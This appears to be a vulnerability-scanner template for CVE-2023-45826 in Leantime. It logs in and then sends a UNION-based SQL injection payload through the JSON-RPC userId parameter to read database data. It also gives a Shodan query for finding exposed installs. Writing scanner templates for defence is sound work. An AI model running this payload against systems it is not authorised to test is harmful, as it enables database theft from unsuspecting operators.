http:
- matchers:
  - part: body
    type: word
    words:
    - /dashboard/home
  raw:
  - 'POST /auth/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Connection: keep-alive


    redirectUrl=http%253A%252F%252Fpdt.re%253A8080%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login

    '
- extractors:
  - group: 1
    internal: false
    part: body
    regex:
    - '"\w+:(.*?)\"'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Request was successful
    - '{{marker}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/jsonrpc HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"method": "leantime.rpc.files.getFilesByModule","jsonrpc": "2.0","id": "1","params":
    {"userId":"9 union select concat(0x{{hex_marker}},0x3a,user()),2,3,4,5,6,7,8,9,10,11--
    -" } }

    '
id: CVE-2023-45826
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:leantime:leantime:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-45826
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-89
    epss-percentile: 0.93993
    epss-score: 0.1359
  description: 'Leantime is an open source project management system. A ''userId''
    variable in `app/domain/files/repositories/class.files.php` is not parameterized.
    An authenticated attacker can send a carefully crafted POST request to `/api/jsonrpc`
    to exploit an SQL injection vulnerability. Confidentiality is impacted as it allows
    for dumping information from the database. This issue has been addressed in version
    2.4-beta-4. Users are advised to upgrade. There are no known workarounds for this
    vulnerability.

    '
  impact: 'Authenticated attackers can exploit SQL injection through the userId parameter
    in the files API to dump database contents, potentially exposing project information,
    user credentials, and sensitive business data from the Leantime system.

    '
  metadata:
    max-request: 2
    product: leantime
    shodan-query: title:"Leantime"
    vendor: leantime
    verified: true
  name: Leantime < 2.4 - Authenticated SQL Injection
  reference:
  - https://github.com/advisories/GHSA-c39w-3pjx-qc7m
  remediation: 'Update Leantime to version 2.4-beta-4 or later that uses parameterized
    queries for the userId variable in app/domain/files/repositories/class.files.php.

    '
  severity: medium
  tags: cve,cve2023,leantime,authenticated,sqli,vuln
variables:
  hex_marker: '{{hex_encode(marker)}}'
  marker: '{{randstr}}'
  password: '{{password}}'
  username: '{{username}}'
